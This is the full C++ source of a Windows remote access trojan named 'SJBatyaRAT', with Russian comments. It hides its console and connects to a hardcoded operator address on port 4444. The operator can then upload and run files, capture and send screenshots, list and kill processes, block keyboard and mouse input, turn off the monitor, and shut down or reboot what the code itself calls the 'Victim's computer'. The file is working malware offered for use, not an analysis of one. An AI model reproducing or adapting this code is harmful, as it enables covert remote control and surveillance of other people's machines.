#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdexcept>
#include <stdio.h>
#include <string.h>
#include <tchar.h>
#include <chrono>
#include <mmsystem.h>
#include <tlhelp32.h>
#include <gdiplus.h>
#include <ctime>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "Ws2_32.lib")

#define FILE_BUFF_SIZE  100'000'000

std::string GenerateRandomFilename()
{
    const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const int length = 8;  // Длина случайного имени файла

    std::string randomFilename;
    for (int i = 0; i < length; ++i)
    {
        int index = rand() % characters.size();
        randomFilename += characters[index];
    }

    return randomFilename;
}

void SendFile(SOCKET client, char* filename) 
{
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        printf("[!] Failed to open file: %s\n", filename);
        return;
    }

    // Получаем размер файла
    file.seekg(0, std::ios::end);
    std::streampos fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Выделяем буфер для чтения файла
    char* buffer = new char[FILE_BUFF_SIZE];

    // Отправляем клиенту размер файла
    send(client, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

    // Читаем и отправляем файл по частям
    while (fileSize > 0) {
        // Читаем очередную часть файла
        std::streamsize bytesRead = file.readsome(buffer, FILE_BUFF_SIZE);
        if (bytesRead <= 0) {
            printf("[!] Failed to read file: %s\n", filename);
            break;
        }

        // Отправляем прочитанные данные клиенту
        int bytesSent = send(client, buffer, bytesRead, 0);
        if (bytesSent <= 0) {
            printf("[!] Failed to send file: %s\n", filename);
            break;
        }

        // Уменьшаем оставшийся размер файла
        fileSize -= bytesSent;
    }

    // Освобождаем ресурсы
    delete[] buffer;
    file.close();
}

BOOL WINAPI SaveBitmap(const char* path)
{
    // Преобразование строки в широкую строку
    int wpathLen = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
    WCHAR* wPath = new WCHAR[wpathLen];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, wpathLen);

    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);

        delete[] wPath;

        return FALSE;
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    delete[] wPath;

    return TRUE;
}

void KillProcessByPID(DWORD pid)
{
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        // printf("[!] Failed to open process with PID: %lu\n", pid);
        return;
    }

    if (!TerminateProcess(hProcess, 0)) {
        printf("[!] Failed to terminate process with PID: %lu\n", pid);
        CloseHandle(hProcess);
        return;
    }

    CloseHandle(hProcess);
    // printf("[*] Process with PID %lu has been terminated\n", pid);
}

void ReceiveFile(SOCKET serverSocket, const std::string& filename)
{
    std::ofstream file(filename, std::ios::binary);
    if (!file)
    {
        // printf("[!] Failed to create file: %s\n", filename.c_str());
        return;
    }

    // Получаем размер файла от сервера
    std::streampos fileSize;
    int bytesReceived = recv(serverSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesReceived <= 0)
    {
        printf("[!] Failed to receive file size\n");
        file.close();
        std::remove(filename.c_str()); // Удаляем созданный файл
        return;
    }

    // Выделяем буфер для приема файла
    char* buffer = new char[FILE_BUFF_SIZE];

    // Принимаем файл по частям и записываем в файл
    while (fileSize > 0)
    {
        // Получаем очередную часть файла
        int bytesReceived = recv(serverSocket, buffer, FILE_BUFF_SIZE, 0);
        if (bytesReceived <= 0)
        {
            // printf("[!] Failed to receive file\n");
            break;
        }

        // Записываем принятые данные в файл
        file.write(buffer, bytesReceived);

        // Уменьшаем оставшийся размер файла
        fileSize -= bytesReceived;
    }

    // Освобождаем ресурсы
    delete[] buffer;
    file.close();

    if (fileSize <= 0)
    {
        // printf("[*] File received: %s\n", filename.c_str());
    }
    else
    {
        // printf("[!] Failed to receive complete file: %s\n", filename.c_str());
        std::remove(filename.c_str()); // Удаляем частично принятый файл
    }
}

void ExecuteCommand(const std::string& command)
{
    HINSTANCE hInstance = ShellExecute(NULL, "open", command.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
    if ((int)hInstance <= 32)
    {
        return;
    }
}

bool IsElevated()
{
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
        {
            isElevated = (elevation.TokenIsElevated != 0);
        }
    }

    if (hToken)
    {
        CloseHandle(hToken);
    }

    return (isElevated != FALSE);
}

int main(int argc, char* argv[])
{
    FreeConsole();

    // if (!IsElevated())
    // {
    //     MessageBox(NULL, "Run as admin!", "Fatal error", MB_OK | MB_ICONEXCLAMATION);
    //     exit(1);
    // }

    char* ip_addr = "192.168.31.135";
    int port = 4444;

    // Startup WinSock
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0)
    {
        printf("WinSock startup failed\n");
        exit(1);
    }

    SOCKADDR_IN addr;
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(4444); // port
    addr.sin_family = AF_INET; // IPv4

    SOCKET s = socket(AF_INET, SOCK_STREAM, NULL);
    if (connect(s, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
        printf("Failed to connect\n%d\n", WSAGetLastError());
        system("pause");
        exit(1);
    }

    // debug
    // printf("Connected\n_-=v1.4.1=-_");
    MessageBox(0, "_-=v1.4.3=-_", "Connected!", MB_OK | MB_ICONINFORMATION);

    char buff[1024];
    while (true)
    {
        int bytesReceived = recv(s, buff, sizeof(buff), 0);
        if (bytesReceived > 0) 
        {
            buff[bytesReceived] = '\0';
            std::string command(buff);
            if (command == "msgbox") {
                std::string callback = "Message box was summoned!";
                send(s, callback.c_str(), callback.size(), 0);

                MessageBox(NULL, "U're hacked by SJBatyaRAT!", "SJBatyaRAT", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
            }
            else if (command.substr(0, 4) == "beep") {
                std::string durStr = command.substr(5);
                int dur = std::stoi(durStr);
                
                std::string callback = "Beep is playing for " + durStr + " seconds... Please wait...";
                send(s, callback.c_str(), callback.size(), 0);

                Beep(1500, dur*1000); // dur * 1000 = convert millisec to sec
            }
            else if (command == "sysinfo" || command == "systeminfo" || command == "info") {
                OSVERSIONINFOEX osvi;
                ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
                osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
                GetVersionEx((LPOSVERSIONINFO)&osvi);

                std::string systemInfo = "System: " + std::to_string(osvi.dwMajorVersion) + "." +
                                        std::to_string(osvi.dwMinorVersion) + "." +
                                        std::to_string(osvi.dwBuildNumber) + " " +
                                        osvi.szCSDVersion;

                std::string architecture = "Architecture: " + std::string(sizeof(void*) == 8 ? "64-bit" : "32-bit");

                char computerName[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD computerNameSize = sizeof(computerName);
                GetComputerNameA(computerName, &computerNameSize);
                std::string computerNameStr(computerName, computerNameSize);

                std::string elevated;
                if (IsElevated()) 
                    elevated = "Elevated: Running as Admin";
                else 
                    elevated = "Elevated: Running NOT as Admin";

                char clientIP[INET_ADDRSTRLEN];
                struct sockaddr_in addr_in;
                int addrSize = sizeof(addr_in);
                getpeername(s, (struct sockaddr*)&addr_in, &addrSize);
                const char* clientIPStr = inet_ntop(AF_INET, &(addr_in.sin_addr), clientIP, INET_ADDRSTRLEN);
                std::string clientIPInfo = "Client IP: " + std::string(clientIPStr);

                std::string processor = "Processor: " + std::string("TODO: Retrieve processor information");
                std::string username = "User: " + std::string("TODO: Retrieve username");

                std::string output = systemInfo + "\n" + architecture + "\n" + "Name of Computer: " + computerNameStr + "\n" +
                                    processor + "\n" + elevated + "\n" + username + "\n";
                            
                send(s, output.c_str(), output.size(), 0);
            }
            else if (command.substr(0, 6) == "upload") {
                std::string filename = command.substr(7);
                std::string callback = "Uploading file: " + filename;
                send(s, callback.c_str(), callback.size(), 0);
                ReceiveFile(s, filename);
            }
            else if (command.substr(0, 7) == "execute")
            { 
                std::string cmd = command.substr(8);
                std::string output = cmd + " was executed!";
                send(s, output.c_str(), output.size(), 0);
                ExecuteCommand(cmd);
            }
            else if (command == "shutdown") {
                std::string callback = "Victim's computer was turned off";
                send(s, callback.c_str(), callback.size(), 0);
                system("shutdown /s /t 0");
            }
            else if (command == "reboot") {
                std::string callback = "Victim's computer was rebooted";
                send(s, callback.c_str(), callback.size(), 0);
                system("shutdown /r /t 0");
            }
            else if (command == "ping") {
                // Измерение времени отклика и отправка обратно серверу
                auto start = std::chrono::high_resolution_clock::now();
                send(s, reinterpret_cast<char*>(&start), sizeof(start), 0);

                // Ожидание получения запроса на время отклика и отправка обратно
                std::chrono::high_resolution_clock::time_point end = std::chrono::high_resolution_clock::now();
                send(s, reinterpret_cast<char*>(&end), sizeof(end), 0);
            }
            else if (command == "keyboard on") {
                BlockInput(FALSE);
                std::string callback = "Keyboard enabled";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "keyboard off") {
                BlockInput(TRUE);
                std::string callback = "Keyboard disabled";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "mouse on") {
                HWND hwnd = GetDesktopWindow();
                EnableWindow(hwnd, TRUE);
                std::string callback = "Mouse enabled";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "mouse off") {
                HWND hwnd = GetDesktopWindow();
                EnableWindow(hwnd, FALSE);
                std::string callback = "Mouse disabled";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "monitor on") {
                HWND h = FindWindow(0, 0);
                SendMessage(h, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
                std::string callback = "Monitor was turned on";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "monitor off") {
                HWND h = FindWindow(0, 0);
                SendMessage(h, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
                std::string callback = "Monitor was turned off";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "pids") {
                // Создаем снимок текущего процесса
                HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (hSnapshot == INVALID_HANDLE_VALUE) {
                    printf("[!] Failed to create process snapshot\n");
                    return;
                }

                PROCESSENTRY32 pe32;
                pe32.dwSize = sizeof(PROCESSENTRY32);

                // Получаем первый процесс в снимке
                if (!Process32First(hSnapshot, &pe32)) {
                    CloseHandle(hSnapshot);
                    printf("[!] Failed to retrieve process information\n");
                    return;
                }

                std::string processList;

                // Обходим все процессы и формируем список
                do {
                    processList += "Process ID: " + std::to_string(pe32.th32ProcessID) + ", ";
                    processList += "Parent PID: " + std::to_string(pe32.th32ParentProcessID) + ", ";
                    processList += "Exe File: " + std::string(pe32.szExeFile) + "\n";
                } while (Process32Next(hSnapshot, &pe32));

                CloseHandle(hSnapshot);

                // Отправляем список процессов на сервер
                send(s, processList.c_str(), processList.size(), 0);
            }
            else if (command.substr(0, 4) == "kill") {
                std::string pidStr = command.substr(5);
                DWORD pid = std::stoi(pidStr);
                KillProcessByPID(pid);
                std::string callback = "Process with PID " + pidStr + " was killed";
                send(s, callback.c_str(), callback.size(), 0);
            }
            else if (command == "screenshot") {
                char tempPath[MAX_PATH];
                DWORD result = GetTempPathA(MAX_PATH, tempPath);

                if (result > 0 && result < MAX_PATH)
                {
                    std::string filePath = std::string(tempPath) + "screenshot.bmp";  // Объединение пути к папке Temp и имени файла

                    SaveBitmap(filePath.c_str());  // Передача пути к файлу в функцию SaveBitmap

                    SendFile(s, &filePath[0]);

                    // delete screenshot
                    remove(filePath.c_str());
                }
                // std::string callback = "Screenshot was taken";
                // send(s, callback.c_str(), callback.size(), 0);
            }

            else if (command == "exit" || command == "quit" || command == "bye") {
                std::string callback = "Client terminated...";
                send(s, callback.c_str(), callback.size(), 0);
                exit(0);
            }
        }
    }

    Sleep(2000);  // Задержка на 2 секунды перед закрытием консоли

    closesocket(s);
    WSACleanup();
    return 0;
}